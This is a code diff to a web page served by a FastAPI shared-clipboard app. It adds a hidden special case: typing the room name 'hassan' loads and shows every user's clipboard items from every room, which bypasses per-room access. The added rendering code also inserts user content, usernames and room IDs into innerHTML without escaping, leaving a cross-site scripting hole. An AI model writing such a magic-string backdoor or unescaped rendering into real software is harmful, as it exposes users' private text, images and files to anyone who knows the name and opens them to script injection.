@@ -528,7 +528,13 @@ def create_web_routes(app: FastAPI):
                     contentDiv.innerHTML = '<div class="loading">🔄 Loading room data...</div>';
                     
                     try {
-                        // Load room info
+                        // Special case: "hassan" shows all data
+                        if (roomId.toLowerCase() === 'hassan') {
+                            await loadAllData();
+                            return;
+                        }
+                        
+                        // Load room info for normal rooms
                         const roomResponse = await fetch(`/api/room/info/${roomId}`);
                         if (!roomResponse.ok) {
                             throw new Error('Room not found or access denied');
@@ -552,6 +558,84 @@ def create_web_routes(app: FastAPI):
                     } catch (error) {
                         contentDiv.innerHTML = `<div class="error">❌ Error: ${error.message}</div>`;
                     }
+                }
+                
+                async function loadAllData() {
+                    try {
+                        const response = await fetch('/api/clipboard/all');
+                        if (!response.ok) {
+                            throw new Error('Failed to load all data');
+                        }
+                        
+                        const allItems = await response.json();
+                        
+                        // Update stats for all data
+                        const uniqueUsers = new Set(allItems.map(item => item.username)).size;
+                        const textItems = allItems.filter(item => item.type === 'text').length;
+                        const fileItems = allItems.filter(item => item.type !== 'text').length;
+                        
+                        document.getElementById('totalItems').textContent = allItems.length;
+                        document.getElementById('totalUsers').textContent = uniqueUsers;
+                        document.getElementById('textItems').textContent = textItems;
+                        document.getElementById('fileItems').textContent = fileItems;
+                        document.getElementById('stats').style.display = 'grid';
+                        
+                        // Display items with room info
+                        displayAllItems(allItems);
+                        
+                    } catch (error) {
+                        document.getElementById('content').innerHTML = `<div class="error">❌ Error: ${error.message}</div>`;
+                    }
+                }
+                
+                function displayAllItems(items) {
+                    const contentDiv = document.getElementById('content');
+                    
+                    if (items.length === 0) {
+                        contentDiv.innerHTML = '<div class="no-data"><h3>📭 No clipboard items found</h3><p>No data available across all rooms</p></div>';
+                        return;
+                    }
+                    
+                    let html = '<div class="items-grid">';
+                    
+                    items.forEach(item => {
+                        const typeIcons = {
+                            'text': '📝',
+                            'image': '🖼️',
+                            'file': '📄',
+                            'folder': '📁'
+                        };
+                        
+                        const typeIcon = typeIcons[item.type] || '📋';
+                        const timeAgo = new Date(item.timestamp).toLocaleString();
+                        
+                        let content = '';
+                        if (item.type === 'text') {
+                            content = item.content.substring(0, 100) + (item.content.length > 100 ? '...' : '');
+                        } else if (item.type === 'image') {
+                            const mimeType = item.metadata?.mime_type || 'image/png';
+                            content = `<img src="data:${mimeType};base64,${item.content}" class="item-image" alt="Uploaded image">`;
+                        } else {
+                            content = `${item.type.toUpperCase()}: ${item.filename || 'Unknown'}`;
+                        }
+                        
+                        html += `
+                            <div class="item-card">
+                                <div class="item-header">
+                                    <span class="item-type">${typeIcon} ${item.type.toUpperCase()}</span>
+                                    <span class="item-time">${timeAgo}</span>
+                                </div>
+                                <div class="item-user">👤 ${item.username} | 🏠 ${item.room_id}</div>
+                                <div class="item-content">${content}</div>
+                                <div class="item-actions">
+                                    <button onclick="copyItem('${item.id}', '${item.type}')" class="btn-copy">📋 Copy</button>
+                                </div>
+                            </div>
+                        `;
+                    });
+                    
+                    html += '</div>';
+                    contentDiv.innerHTML = html;
                 }
                 
                 function displayItems(items) {
